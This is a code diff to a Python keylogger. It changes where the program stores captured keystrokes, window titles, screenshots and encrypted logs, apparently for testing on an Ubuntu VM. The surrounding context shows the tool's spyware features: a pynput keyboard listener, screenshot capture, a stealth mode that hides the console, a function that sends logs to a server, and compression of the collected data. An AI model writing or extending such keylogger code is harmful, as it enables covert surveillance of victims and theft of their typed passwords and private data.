@@ -12,6 +12,46 @@ import platform
 import zipfile
 import logging
 
+# For Linux (Ubuntu VM)
+DESKTOP_DIR = os.path.join(os.getenv("HOME"), "Desktop")
+CAPTURED_DATA_DIR = os.path.join(DESKTOP_DIR, "key_logger_captured_data")
+LOG_DIR = os.path.join(CAPTURED_DATA_DIR, "Keylogger")
+KEYSTROKES_DIR = os.path.join(LOG_DIR, "keystrokes")
+WINDOW_TITLES_DIR = os.path.join(LOG_DIR, "window_titles")
+SCREENSHOTS_DIR = os.path.join(LOG_DIR, "screenshots")
+ENCRYPTED_LOGS_DIR = os.path.join(LOG_DIR, "encrypted_logs")
+OTHER_LOGS_DIR = os.path.join(LOG_DIR, "other_logs")
+
+# Function to create directories
+def create_directories():
+    try:
+        # Create main directory if it doesn't exist
+        if not os.path.exists(CAPTURED_DATA_DIR):
+            os.makedirs(CAPTURED_DATA_DIR)
+        # Create Keylogger directory if it doesn't exist
+        if not os.path.exists(LOG_DIR):
+            os.makedirs(LOG_DIR)
+        # Create keystrokes directory if it doesn't exist
+        if not os.path.exists(KEYSTROKES_DIR):
+            os.makedirs(KEYSTROKES_DIR)
+        # Create window titles directory if it doesn't exist
+        if not os.path.exists(WINDOW_TITLES_DIR):
+            os.makedirs(WINDOW_TITLES_DIR)
+        # Create screenshots directory if it doesn't exist
+        if not os.path.exists(SCREENSHOTS_DIR):
+            os.makedirs(SCREENSHOTS_DIR)
+        # Create encrypted logs directory if it doesn't exist
+        if not os.path.exists(ENCRYPTED_LOGS_DIR):
+            os.makedirs(ENCRYPTED_LOGS_DIR)
+        # Create other logs directory if it doesn't exist
+        if not os.path.exists(OTHER_LOGS_DIR):
+            os.makedirs(OTHER_LOGS_DIR)
+    except Exception as e:
+        logging.error(f"Error creating directories: {e}")
+
+# Call the function to create directories
+create_directories()
+
 # Key for AES encryption (must be 16, 24, or 32 bytes long)
 AES_KEY = "your_AES_key_here"  # Replace with your AES key
 
@@ -20,16 +60,13 @@ if platform.system() == "Windows":
     import win32gui
     import win32process
     from PIL import ImageGrab as ImageGrab  # PIL is a cross-platform library
-    LOG_DIR = os.path.join(os.getenv("APPDATA"), "Keylogger")  # Windows
     LOG_FILE_NAME = "keylog.txt"  # Windows
 elif platform.system() == "Darwin":
     from Quartz import CGWindowListCopyWindowInfo, kCGWindowListOptionOnScreenOnly, kCGNullWindowID
     from PIL import ImageGrab as ImageGrab  # PIL is a cross-platform library
-    LOG_DIR = os.path.join(os.getenv("HOME"), "Library", "Logs", "Keylogger")  # macOS
     LOG_FILE_NAME = "keylog.txt"  # macOS
 else:
     import pyscreenshot as ImageGrab  # pyscreenshot works on Linux
-    LOG_DIR = os.path.join(os.getenv("HOME"), ".keylogger")  # Linux
     LOG_FILE_NAME = "keylog.txt"  # Linux
 
 LOG_INTERVAL = 60  # Default log interval in seconds
@@ -101,14 +138,6 @@ def send_to_server(log):
         logging.error(f"Error sending log to server: {e}")
 
 
-def create_log_dir():
-    try:
-        if not os.path.exists(LOG_DIR):
-            os.makedirs(LOG_DIR)
-    except Exception as e:
-        logging.error(f"Error creating log directory: {e}")
-
-
 def hide_console():
     try:
         if platform.system() == "Windows":
@@ -142,7 +171,7 @@ def get_active_window_title():
 def capture_screenshot():
     try:
         screenshot = ImageGrab.grab()
-        with open(os.path.join(LOG_DIR, "screenshot_" + str(uuid.uuid4()) + ".png"), "wb") as f:
+        with open(os.path.join(SCREENSHOTS_DIR, "screenshot_" + str(uuid.uuid4()) + ".png"), "wb") as f:
             screenshot.save(f, "PNG")
     except Exception as e:
         logging.error(f"Error capturing screenshot: {e}")
@@ -150,7 +179,7 @@ def capture_screenshot():
 
 def start_keylogger():
     try:
-        create_log_dir()
+        create_directories()
         if CONFIG['stealth_mode']:
             hide_console()
         with pynput.keyboard.Listener(on_press=write_to_file) as listener:
@@ -169,7 +198,7 @@ def check_log_time():
 
 def compress_logs():
     try:
-        with zipfile.ZipFile(os.path.join(LOG_DIR, "logs.zip"), 'w') as zipf:
+        with zipfile.ZipFile(os.path.join(OTHER_LOGS_DIR, "logs.zip"), 'w') as zipf:
             for root, dirs, files in os.walk(LOG_DIR):
                 for file in files:
                     zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), LOG_DIR))
